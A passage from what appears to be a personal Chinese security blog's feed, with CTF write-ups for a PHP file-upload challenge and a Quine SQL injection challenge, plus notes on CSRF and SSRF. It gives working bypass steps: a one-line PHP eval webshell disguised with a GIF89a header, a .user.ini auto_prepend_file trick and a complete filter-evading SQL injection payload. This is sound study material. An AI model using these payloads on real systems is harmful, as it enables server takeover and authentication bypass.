<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// error_reporting(0);</span></span><br><span class="line"><span class="variable">$userdir</span> = <span class="string">&quot;uploads/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$userdir</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$userdir</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$userdir</span> . <span class="string">&quot;/index.php&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;upload&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;fileUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;fileUpload&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$tmp_name</span>) &#123;<span class="comment">//应该是限制了文件大小</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;filesize too big!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$name</span>) &#123;<span class="comment">//文件不可以为空</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;filename cannot be empty!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$name</span>, <span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph|htacess/i&quot;</span>, <span class="variable">$extension</span>)) &#123;<span class="comment">//黑名单正则过滤</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;illegal suffix!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">mb_strpos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp_name</span>), <span class="string">&quot;&lt;?&quot;</span>) !== <span class="literal">FALSE</span>) &#123;<span class="comment">//对文件内容进行检测</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&amp;lt;? in contents!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$image_type</span> = <span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$tmp_name</span>);<span class="comment">//再次对文件的类型进行过滤</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;exif_imagetype:not image!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$upload_file_path</span> = <span class="variable">$userdir</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$name</span>;<span class="comment">//上传文件成功显示目录的文件</span></span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>, <span class="variable">$upload_file_path</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Your dir &quot;</span> . <span class="variable">$userdir</span>. <span class="string">&#x27; &lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your files : &lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="variable">$userdir</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>相关代码作用见注释，主要是几个点要记录一下。<br><code>1、黑名单正则匹配后缀如何绕过</code></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ph|htacess/i&quot;</span>, <span class="variable">$extension</span>)) &#123;<span class="regexp">//</span>黑名单正则过滤</span><br><span class="line">        die(<span class="string">&quot;illegal suffix!&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>（1）、垃圾符号<br>就是加入很多符号，企图让其崩。<br>详情：<a href="https://blog.csdn.net/qq_53079406/article/details/123525882">https://blog.csdn.net/qq_53079406/article/details/123525882</a><br>（2）、配置文件<br>apache的.htaccess<br>php通用的<code>.user.ini</code>。<br><a href="https://www.cnblogs.com/gaonuoqi/p/12337572.html">https://www.cnblogs.com/gaonuoqi/p/12337572.html</a><br><code>2、若检测文件的内容如何绕过检测</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mb_strpos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp_name</span>), <span class="string">&quot;&lt;?&quot;</span>) !== <span class="literal">FALSE</span>) &#123;<span class="comment">//对文件内容进行检测</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;&amp;lt;? in contents!&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>（1）、改用script脚本</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>($_REQUEST[<span class="number">1</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>3、exif_imagetype函数如何绕过</code></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="variable">$image_type</span> = exif_imagetype(<span class="variable">$tmp_name</span>);<span class="regexp">//</span>再次对文件的类型进行过滤</span><br><span class="line">   <span class="keyword">if</span> (!<span class="variable">$image_type</span>) &#123;</span><br><span class="line">       die(<span class="string">&quot;exif_imagetype:not image!&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>这里介绍一下exif_imagetype()。</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="meta"># exif_imagetype — 判断一个图像的类型</span></span><br><span class="line"><span class="meta"># 语法</span></span><br><span class="line">exif_imagetype(<span class="built_in">string</span> $filename): <span class="built_in">int</span></span><br><span class="line">$filename 被检查的图像文件名。</span><br><span class="line"><span class="meta"># 返回值：如果发现了恰当的签名则返回一个对应的常量，否则返回 false</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># exif_imagetype() 读取一个图像的第一个字节并检查其签名。</span></span><br><span class="line"><span class="meta"># 本函数可用来避免调用其它 exif 函数用到了不支持的文件类型上或和 $_SERVER[<span class="string">&#x27;HTTP_ACCEPT&#x27;</span>] 结合使用来检查浏览器是否可以显示某个指定的图像。</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 预定义的常量</span></span><br><span class="line"><span class="number">1</span>	IMAGETYPE_GIF</span><br><span class="line"><span class="number">2</span>	IMAGETYPE_JPEG</span><br><span class="line"><span class="number">3</span>	IMAGETYPE_PNG</span><br><span class="line"><span class="number">4</span>	IMAGETYPE_SWF</span><br><span class="line"><span class="number">5</span>	IMAGETYPE_PSD</span><br><span class="line"><span class="number">6</span>	IMAGETYPE_BMP</span><br><span class="line"><span class="number">7</span>	IMAGETYPE_TIFF_II（Intel 字节顺序）</span><br><span class="line"><span class="number">8</span>	IMAGETYPE_TIFF_MM（Motorola 字节顺序）</span><br><span class="line"><span class="number">9</span>	IMAGETYPE_JPC</span><br><span class="line"><span class="number">10</span>	IMAGETYPE_JP2</span><br><span class="line"><span class="number">11</span>	IMAGETYPE_JPX</span><br><span class="line"><span class="number">12</span>	IMAGETYPE_JB2</span><br><span class="line"><span class="number">13</span>	IMAGETYPE_SWC</span><br><span class="line"><span class="number">14</span>	IMAGETYPE_IFF</span><br><span class="line"><span class="number">15</span>	IMAGETYPE_WBMP</span><br><span class="line"><span class="number">16</span>	IMAGETYPE_XBM</span><br></pre></td></tr></table></figure>
<p>（1）、魔术幻术头<br>在文件前添加GIF89a然后上传。<br><code>几个知识点以及注意点已经记录，那么这道题怎么破？</code><br>利用.use.ini<br><a href="https://blog.csdn.net/weixin_33694172/article/details/87981584">https://blog.csdn.net/weixin_33694172/article/details/87981584</a><br><code>.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。</code><br>所以，构造一个.user.ini，内容如下然后上传。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="attribute">auto_prepend_file</span>=123.png</span><br></pre></td></tr></table></figure>
<p><code>这句代码的意思是，指定123.png文件每次都包含在要执行的php文件前，前提是目录下有.php文件。上文中提到了目录下有index.php文件，那么满足条件，只要访问index.php，那么123.png文件的代码都会先执行</code><br>再构造一句话</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>($_REQUEST[<span class="number">8</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>找一张图片，合成图片马（无所谓）</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">copy</span> <span class="number">1</span>.png+<span class="number">1</span>.php <span class="number">123</span>.png</span><br></pre></td></tr></table></figure>
<p>将这些全部上传后，先尝试访问index.php观察一句话木马文件是否被包含。<br><img src="https://pic.imgdb.cn/item/657935d0c458853aef7e7595.jpg"><br>直接蚁剑连接找flag（当然也可以直接在url上输入命令）<br><img src="https://pic.imgdb.cn/item/657935e0c458853aef7ea62c.jpg"><br>参考:<a href="https://www.cnblogs.com/gaonuoqi/p/12337572.html">https://www.cnblogs.com/gaonuoqi/p/12337572.html</a></p>
<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>这道题看我上面的[强网杯 2019] 随便注–SQL 注入 | 堆叠注入，几乎一样是堆叠注入的思路。</p>
]]></content>
      <categories>
        <category>Recorder</category>
      </categories>
      <tags>
        <tag>实战练习心得</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfHub|Recording</title>
    <url>/2023/11/15/ctfHub/</url>
    <content><![CDATA[<h2 id="第五空间智能安全大赛-Web-yet-another-mysql-SQL-Quine注入"><a href="#第五空间智能安全大赛-Web-yet-another-mysql-SQL-Quine注入" class="headerlink" title="第五空间智能安全大赛-Web-yet_another_mysql|SQL|Quine注入"></a>第五空间智能安全大赛-Web-yet_another_mysql|SQL|Quine注入</h2><h3 id="发现漏洞-key"><a href="#发现漏洞-key" class="headerlink" title="发现漏洞|key"></a>发现漏洞|key</h3><p>花费50金币开启靶机,是一个login界面。<br>我是先一顿乱登陆，发现只有admin可以进去。（其实人家标题已经写清楚了e）<br>那就查看源码，发现&#x2F;?source，疑似验证源码，访问一下。<br><img src="https://pic.imgdb.cn/item/65549f58c458853aef514b1d.jpg"><br>那就开始代码审计</p>
<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;lib.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alertMes</span>(<span class="params"><span class="variable">$mes</span>,<span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;$mes&#125;</span>&#x27;);location.href=&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;<span class="comment">//对输入的password字段的正则表达式匹配</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;<span class="comment">//user不为admin不予通过，那就是user字段必须为admin</span></span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;only admin can login&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">checkSql</span>(<span class="variable">$password</span>);<span class="comment">//对输入的password调用checksql进行校验</span></span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;<span class="comment">//这是关键的sql查询语句</span></span><br><span class="line">    <span class="variable">$user_result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);<span class="comment">//将sql语句带入到数据库查询，查询成功返回true；否则返回false。</span></span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$user_result</span>);<span class="comment">//取出查询返回的对象</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;something wrong&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;<span class="comment">//将查询出来的password与输入的匹配，如果类型以及数据一样那就可以显示flag。</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="审计后的思路"><a href="#审计后的思路" class="headerlink" title="审计后的思路"></a>审计后的思路</h3><p>1、首先校验存在一个正则表达式，这是不是可以通过&#x2F;**&#x2F;内联注释绕过，等下尝试以下。<br>2、</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;<span class="regexp">//</span>将查询出来的password与输入的匹配，如果类型以及数据一样那就可以显示flag。</span><br><span class="line">    die(<span class="variable">$FLAG</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这段代码说明我们只可以在password字段进行操作，但是限制得比较苛刻，只有密码完全匹配上才显示flag。平时我们做的sql题目就靠爆字段就可以爆出flag，这里使用以前的思路明显不可行。<br>这里的思路是：<code>Quine注入</code>，即控制我们输入的语句以及后端数据库处理后输出的sql语句一致就可以绕过密码验证输出flag了。<br>那么我们该如何构造输入输出一致的payload呢，<code>接下来就是重点</code></p>
<h3 id="Quine注入"><a href="#Quine注入" class="headerlink" title="Quine注入"></a>Quine注入</h3><p>1、首先得了解sql函数：<code>replace()</code><br>replace(object,search,replace)<br>把object对象中出现的的search全部替换成replace</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> replace(&quot;.&quot;,<span class="type">char</span>(<span class="number">46</span>),&quot;.&quot;);# <span class="type">char</span>(<span class="number">46</span>)就是.</span><br></pre></td></tr></table></figure>
<p>输出：一个.<br>2、输入输出如何大致可以一致</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">select replace(&#x27;replace(<span class="string">&quot;.&quot;</span>,char(<span class="number">46</span>),<span class="string">&quot;.&quot;</span>)&#x27;,char(<span class="number">46</span>),&#x27;replace(<span class="string">&quot;.&quot;</span>,char(<span class="number">46</span>),<span class="string">&quot;.&quot;</span>)&#x27;)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">replace</span><span class="params">(<span class="string">&quot;replace(&quot;</span>.<span class="string">&quot;,char(46),&quot;</span>.<span class="string">&quot;)&quot;</span>,char(<span class="number">46</span>)</span></span>,<span class="string">&quot;replace(&quot;</span>.<span class="string">&quot;,char(46),&quot;</span>.<span class="string">&quot;)&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>但是还有单双引号不同。<br>3、解决单双引号不同的问题<br>有了上面的经验后，我们这样考虑，如果先将双引号替换成单引号是不是就可以解决引号不同的问题了。实现方法无非就是在套一层replace</p>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">select <span class="built_in">replace</span>(<span class="built_in">replace</span>(&#x27;<span class="string">&quot;.&quot;</span>&#x27;,<span class="built_in">char</span>(<span class="number">34</span>),<span class="built_in">char</span>(<span class="number">39</span>)),<span class="built_in">char</span>(<span class="number">46</span>),<span class="string">&quot;.&quot;</span>);# 先执行内层<span class="built_in">replace</span></span><br></pre></td></tr></table></figure>
<p>输出：’.’</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">select replace(<span class="name">replace</span>(&#x27;replace(<span class="name">replace</span>(<span class="string">&quot;.&quot;</span>,char(<span class="number">34</span>),char(<span class="number">39</span>)),char(<span class="number">46</span>),<span class="string">&quot;.&quot;</span>)&#x27;,char(<span class="number">34</span>),char(<span class="number">39</span>)),char(<span class="number">46</span>),&#x27;replace(<span class="name">replace</span>(<span class="string">&quot;.&quot;</span>,char(<span class="number">34</span>),char(<span class="number">39</span>)),char(<span class="number">46</span>),<span class="string">&quot;.&quot;</span>)&#x27;)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">replace</span>(<span class="keyword">replace</span>(&#x27;<span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="string">&quot;.&quot;</span>,<span class="built_in">char</span>(34),<span class="built_in">char</span>(39)),<span class="built_in">char</span>(46),<span class="string">&quot;.&quot;</span>)&#x27;,<span class="built_in">char</span>(34),<span class="built_in">char</span>(39)),<span class="built_in">char</span>(46),&#x27;<span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="string">&quot;.&quot;</span>,<span class="built_in">char</span>(34),<span class="built_in">char</span>(39)),<span class="built_in">char</span>(46),<span class="string">&quot;.&quot;</span>)&#x27;)<span class="comment">//其实就是将2中的内容加上&#x27;&#x27;以及去掉原来的&#x27;&#x27;(因为是将这一整句话的&quot;&quot;换成&#x27;&#x27;)放入object以及replace中</span></span><br></pre></td></tr></table></figure>
<p>此刻，输入输出完全一致。</p>
<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><p>经过上面的分析，我们可以控制输入输出一致，但是还有一个问题，我们该如何绕过正则？<br><code>内联注释/**/</code><br>payload:</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">1&#x27;<span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="keyword">replace</span>(<span class="keyword">replace</span>(&#x27;1<span class="string">&quot;/**/union/**/select/**/replace(replace(&quot;</span>.<span class="string">&quot;,char(34),char(39)),char(46),&quot;</span>.<span class="string">&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;1&quot;</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="string">&quot;.&quot;</span>,<span class="built_in">char</span>(34),<span class="built_in">char</span>(39)),<span class="built_in">char</span>(46),<span class="string">&quot;.&quot;</span>)#&#x27;)#</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>Char(34)：&quot; ；Char(39)：&#39; ； char(46)：.</code><br>输入到password中。<br>这样即可获取flag。<br><img src="https://pic.imgdb.cn/item/65549f60c458853aef515b16.jpg"></p>
<p><code>参考文献</code><br>SQL的replace()函数：<a href="https://www.php.cn/faq/554187.html">https://www.php.cn/faq/554187.html</a><br>Quine注入：<a href="https://blog.csdn.net/weixin_53090346/article/details/125531088">https://blog.csdn.net/weixin_53090346/article/details/125531088</a><br>php函数 mysqli_query：<a href="https://www.python100.com/html/55864.html">https://www.python100.com/html/55864.html</a><br>php函数 mysqli_fetch_array：<a href="https://www.php.cn/faq/585787.html">https://www.php.cn/faq/585787.html</a><br>参考wp：<a href="https://www.cnblogs.com/zhengna/p/15917521.html">https://www.cnblogs.com/zhengna/p/15917521.html</a></p>
]]></content>
      <categories>
        <category>Recorder</category>
      </categories>
      <tags>
        <tag>实战练习心得</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF以及SSRF</title>
    <url>/2023/10/13/csrf/</url>
    <content><![CDATA[<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>CSRF（Cross-site Request Forgery，跨站请求伪造）是一种针对网站的恶意利用。<br>CSRF攻击可以利用用户已经登陆或已经授权的状态，伪造合法用户发出请求给受信任的网点，从而实现在未授权的情况下执行一些特权操作。<br>CSRF与XSS听起来很像，但攻击方式完全不同。XSS攻击是利用受信任的站点攻击客户端用户，而CSRF是伪装成受信任的用户攻击受信任的站点。<br>参考:<br>CSRF漏洞详解:<a href="https://blog.csdn.net/xcxhzjl/article/details/121411039">https://blog.csdn.net/xcxhzjl/article/details/121411039</a></p>
<h3 id="实现前提"><a href="#实现前提" class="headerlink" title="实现前提"></a>实现前提</h3><p>●用户成功登陆了网站系统，能执行授权的功能。!!!<br>●目标用户访问了攻击者构造的恶意URL,比如恶意引导用户点击含有恶意URL的网址。</p>
<h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=28&vd_source=d32bce54780cf3d9710df43274886fde">CSRF–pikachu演示:5:00</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=28&vd_source=d32bce54780cf3d9710df43274886fde">检测有无CSRF漏洞:11:40</a><br>1、一般存在于有修改、更新、删除个人信息的页面。<br>2、可以xss配合csrf。</p>
<h3 id="CSRF防御方案"><a href="#CSRF防御方案" class="headerlink" title="CSRF防御方案"></a>CSRF防御方案</h3><p>1、当用户发送重要的请求时需要输入原始密码。<br>2、设置随机 Token。(最有效)<br>Token:相当于是每一个数据包的编号,若检测当前数据包的Token对应不上,则直接取消此操作。是服务器端源码生成的，可以放在一个hidden表单里面，客户端提交的时候post回服务端检验。<br>3、检验 referer 来源，请求时判断请求链接是否为当前管理员正在使用的页面（管理员在编辑文章，<br>黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败）–同源策略。<br>4、设置验证码。<br>5、限制请求方式只能为 POST。</p>
<h2 id="SSRF-important"><a href="#SSRF-important" class="headerlink" title="SSRF(important)"></a>SSRF(important)</h2><p>原理：<a href="https://www.cnblogs.com/happystudyhuan/p/11802961.html">https://www.cnblogs.com/happystudyhuan/p/11802961.html</a></p>
<h3 id="SSRF漏洞介绍："><a href="#SSRF漏洞介绍：" class="headerlink" title="SSRF漏洞介绍："></a>SSRF漏洞介绍：</h3><p>　　SSRF漏洞(服务器端请求伪造):是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。<br><img src="https://pic.imgdb.cn/item/652905a7c458853aef5c880c.png" alt="图一" title="SSRF漏洞知识点"><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=28&vd_source=d32bce54780cf3d9710df43274886fde">简单SSRF漏洞:30：00</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=28&vd_source=d32bce54780cf3d9710df43274886fde">对SSRF漏洞的“抽象”解释:40:00</a></p>
<h3 id="SSRF漏洞原理："><a href="#SSRF漏洞原理：" class="headerlink" title="SSRF漏洞原理："></a>SSRF漏洞原理：</h3><p>　　SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。SSRF是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">其实就是借助服务器的SSRF漏洞,使服务器成为一个“跳板”,通过这个“跳板”便可以探针内网。</span><br></pre></td></tr></table></figure>
<h3 id="SSRF漏洞利用手段："><a href="#SSRF漏洞利用手段：" class="headerlink" title="SSRF漏洞利用手段："></a>SSRF漏洞利用手段：</h3><p>通过http、file(访问服务器自身–本地,无法探测内网)、dict、ftp、gopher等协议<br>　　1.可以对外网、内网、本地进行端口扫描，某些情况下端口的Banner会回显出来（比如3306的）–端口扫描；<br>　　2.攻击运行在内网或本地的有漏洞程序（比如溢出）；<br>　　3.可以对内网Web应用进行指纹识别，原理是通过请求默认的文件得到特定的指纹；<br>　　4.攻击内网或外网有漏洞的Web应用；<br>　　5.使用file：&#x2F;&#x2F;&#x2F;协议读取本地文件(或其他协议)</p>
<h3 id="SSRF漏洞较容易出现地点："><a href="#SSRF漏洞较容易出现地点：" class="headerlink" title="SSRF漏洞较容易出现地点："></a>SSRF漏洞较容易出现地点：</h3><p>　　1.分享：通过URL地址分享网页内容　　　　　　　　　　　　　　　　　　　　　　　　　　<br>　　2.转码服务（通过URL地址把原地址的网页内容调优，使其适合手机屏幕的浏览）<br>　　3.在线翻译<br>　　4.图片加载与下载：通过URL地址加载或下载图片<br>　　5.图片、文章收藏功能<br>　　6.未公开的api实现及调用URL的功能<br>　　7.从URL关键字中寻找<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=28&vd_source=d32bce54780cf3d9710df43274886fde">SSRF示例演示–本地:51:00</a><br>！！！<a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=28&vd_source=d32bce54780cf3d9710df43274886fde">SSRF示例演示–实战(真实示例):1：00:00</a><br>注意:<br>1、如何知道其内网段?<br>内网段一般都是10.xx.xx.xx或192.xx.xx.xx,用字典爆破,看哪个有返回信息即可。<br>2、<br><img src="https://pic.imgdb.cn/item/6529407fc458853aef03fd17.png" alt="图二" title="使用SSRF时,网站脚本类型与应当选用何种协议"></p>
]]></content>
      <categories>
        <category>CSRF|SSRF</category>
      </categories>
      <tags>
        <tag>CSRF|SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>php代码审计</title>
    <url>/2023/11/16/daimashenji/</url>
